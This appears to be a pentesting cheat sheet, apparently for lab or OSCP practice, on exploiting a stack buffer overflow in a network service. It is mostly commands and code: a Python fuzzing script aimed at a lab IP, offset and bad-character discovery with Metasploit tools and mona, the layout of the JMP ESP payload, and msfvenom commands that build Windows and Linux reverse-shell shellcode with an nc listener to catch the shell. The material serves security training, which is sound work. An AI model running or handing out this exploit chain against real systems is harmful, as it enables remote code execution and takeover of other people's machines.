# Buffer Overflow

## Spiking

```
nc -nv IP PORT
```

Find the available commands and start spiking to find vulnerable command

```
generic_send_tcp HOST PORT stats.spk 0 0
```

![](https://gblobscdn.gitbook.com/assets%2F-M51QhT21xpEfTWU4ttG%2F-M8cReh2zkyhBACCl7vO%2F-M8cU83zQipL95cfqvQC%2Fimage.png?alt=media&token=1bc70c72-77b6-4e57-9960-d9a48014bb25)

## Fuzzing

![](https://gblobscdn.gitbook.com/assets%2F-M51QhT21xpEfTWU4ttG%2F-M8cReh2zkyhBACCl7vO%2F-M8cTEGEamXhaJImCMqC%2Fimage.png?alt=media&token=ff09d187-8820-477d-95cb-f4d33e8e481d)

```python
#!/usr/bin/python
import socket

buffer = ["A"]

counter = 100

while len(buffer) <=30:
    buffer.append("A" * counter)
    counter = counter + 100

for string in buffer:
    print "Fuzzing with %s bytes" % len(string)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect = s.connect(('10.10.153.41',31337))
    s.send(string + '\r\n')
    data = s.recv(1024)
    s.close()
```

## Finding the Offset

```
/usr/share/metasploit-framework/tools/exploits/pattern_create.rb -l CRASHBYTES
```

Copy the output and paste value into the buffer variable in the script.

Run the script and find the EIP overwritten value (Ex: 35724134)

```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
```

Get exact match for the offset

Or using mona

```
!mona findmsp -distance CRASHBYTES
```

## Overwrite the EIP

&gt; [*] Exact match at offset 524


Great! Now our payload will be as follow "A"*524 + "B"*4 + badchars. Updated script gives following result:

## Finding bad characters

```
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

The first of all we should remove from our payload **\x00**(null byte - break everything what is next) and **\x90** (No Operation - do nothing)

Add badchars to script right after the EIP

![](https://gblobscdn.gitbook.com/assets%2F-M51QhT21xpEfTWU4ttG%2F-M8cUd37vodaipUY5pEl%2F-M8cZ3BlmMhRhEf21j5d%2Fimage.png?alt=media&token=a97cb5b0-b567-4c5f-af74-42e332f553c9)

Follow ESP Hex dump and see what values are missing. (In imunity debugger)

![](https://gblobscdn.gitbook.com/assets%2F-M51QhT21xpEfTWU4ttG%2F-M8cUd37vodaipUY5pEl%2F-M8cZVYS6eoVCRqjnlF3%2Fimage.png?alt=media&token=6f8de275-e382-4a3f-b66c-95ec35a29408)

Find the bad chars and keep removing them from the script and repeating the process.

Or making use of mona simply run the following command

```
!mona bytearray -b "\x00"
```

Run the script and take not of the memory address to which the ESP register points. Then use it in the following command:

```
!mona compare -f C:\mona\oscp\bytearray.bin -a 0124FA18
```

Not all of these might be bad chars! Sometimes bad chars cause the next byte to get corrupted as well, or even affect the rest of the string. Use trial and error.

## Finding the right ESP jump instruction

Import mona modules into Immunity debugger

[GitHub - corelan/mona: Corelan Repository for mona.py](https://github.com/corelan/mona)

In Immunity debugger
```
!mona jmp -r esp
Or browse Window->Log Data
```

From this command retrieve the JMP address (080414C3). 
Convert big endian into little endian.
080414C3 --> c3140408

**Alternatively**

In Immunity debugger
```
!mona modules
```

Find modules with protection settings set to false and attatched to the process.
(essdunc.dll in this case)

HEX Code equivalent to JMP ESP is FFE4
With this information we can find the JMP address in the dll

```
!mona find -s "\xff\xe4" -m essdunc.dll
```

Retrieve the return addresses for the JMP address

Now, we find our **JMP ESP** address - 311712F3
 So, our payload will be as follow: **"A" * 2003 + "\xf3\x12\x17\x31" + "\x90" * 32 + shell_code.**.
 Also add a few \x90 NOP values before the shell code.
 Note that the JMP address is in reverse

## Generate shell code

Test by first trying to open the calculator
```
msfvenom -p windows/exec -b "\x00" -f python --var-name shellcode CMD=calc.exe EXITFUNC=thread
```

For windows boxes:
```
 msfvenom -p windows/shell_rever se_tcp LHOST= LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

  msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=4444 EXITFUNC=thread -f python c -a x86 -b "\x00\x0a"
```

For Linux box:
```
msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.8.26.76 LPORT=9001 -f c -a x86 --platform linux -b "\x00" -e x86/shikata_ga_nai
```
Note the bad characters. Copy the payload result. Also available: linux/x86/shell_reverse_tcp.

![](https://gblobscdn.gitbook.com/assets%2F-M51QhT21xpEfTWU4ttG%2F-M8cUd37vodaipUY5pEl%2F-M8cdIb2OHPn2ocrmEbE%2Fimage.png?alt=media&token=4139ddff-3288-4f24-88e8-028dec2f975f)

Lastly run the exploit and listen for connections:

```
nc -nvlp 4444
```

## Additional reading

[dostackbufferoverflowgood/dostackbufferoverflowgood_tutorial.pdf at master · justinsteven/dostackbufferoverflowgood · GitHub](https://github.com/justinsteven/dostackbufferoverflowgood/blob/master/dostackbufferoverflowgood_tutorial.pdf)